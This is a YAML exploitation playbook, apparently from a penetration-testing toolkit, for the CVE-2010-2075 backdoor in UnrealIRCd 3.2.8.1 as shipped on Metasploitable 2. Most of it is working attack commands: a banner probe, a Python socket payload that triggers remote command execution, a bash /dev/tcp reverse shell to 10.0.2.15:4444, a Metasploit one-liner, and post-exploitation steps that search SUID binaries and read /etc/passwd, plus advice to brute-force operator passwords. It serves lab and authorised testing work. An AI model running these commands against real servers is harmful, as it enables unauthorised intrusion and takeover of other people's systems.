chain_id: unrealircd_cve_2010_2075
title: "UnrealIRCd 3.2.8.1 — CVE-2010-2075 source-tarball backdoor → unauth RCE"
severity: CRITICAL
tags: [irc, unrealircd, cve-2010-2075, backdoor, rce, metasploitable]

trigger:
  any_of:
    - { kind: "CVE-2010-2075" }
    - { service_pattern: "(?i)irc(d)?|unrealircd" }
    - { banner_pattern: "(?i)unreal" }
    - { product_pattern: "(?i)unreal\\s*ircd" }
    - { port_in: [6667, 6660, 6669, 6697, 7000] }

description: |
  UnrealIRCd 3.2.8.1 source mirrors were trojan-modified in late 2009.
  The backdoor: send any message containing the literal string
  `AB;<command>` to the IRCd, and `<command>` runs as the IRCd user.
  Metasploitable 2 ships the trojaned tarball on 6667. Patched
  versions and the official 3.2.8.2 release ship cleanly.

steps:
  - id: 1
    title: "Probe — banner on 6667 mentions UnrealIRCd"
    command: |
      nc -nv $VICTIMA 6667
      # Banner:
      #   :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
      #   :irc.Metasploitable.LAN 001 ... ircd Unreal3.2.8.1 ...

  - id: 2
    title: "One-shot RCE — id"
    command: |
      python3 - <<'PY'
      import socket
      s=socket.create_connection(("$VICTIMA",6667))
      s.sendall(b"AB;id\n")
      print(s.recv(2048).decode())
      PY

  - id: 3
    title: "Reverse shell"
    command: |
      nc -lvnp 4444
      python3 - <<'PY'
      import socket
      s=socket.create_connection(("$VICTIMA",6667))
      s.sendall(b"AB;bash -c 'bash -i >& /dev/tcp/10.0.2.15/4444 0>&1' &\n")
      PY

  - id: 4
    title: "Or with Metasploit"
    command: |
      msfconsole -qx 'use exploit/unix/irc/unreal_ircd_3281_backdoor; \
        set RHOSTS $VICTIMA; set RPORT 6667; \
        set PAYLOAD cmd/unix/reverse; \
        set LHOST 10.0.2.15; set LPORT 4444; run'

  - id: 5
    title: "Post — usually runs as 'irc' or 'nobody', escalate"
    command: |
      find / -perm -4000 -type f 2>/dev/null
      sudo -l
      cat /etc/passwd  # look for service users with shells

common_errors:
  - error: "AB;id sent but no response"
    solution: |
      Patched build (3.2.8.2+) or modern Unreal4/5/6. Banner check
      first — anything not 3.2.8.1 is not vulnerable to this exact
      bug. Pivot to brute-forcing operator passwords if banner shows
      OPER lines.

references:
  - https://nvd.nist.gov/vuln/detail/CVE-2010-2075
  - https://www.unrealircd.org/txt/unrealsecadvisory.20100612.txt
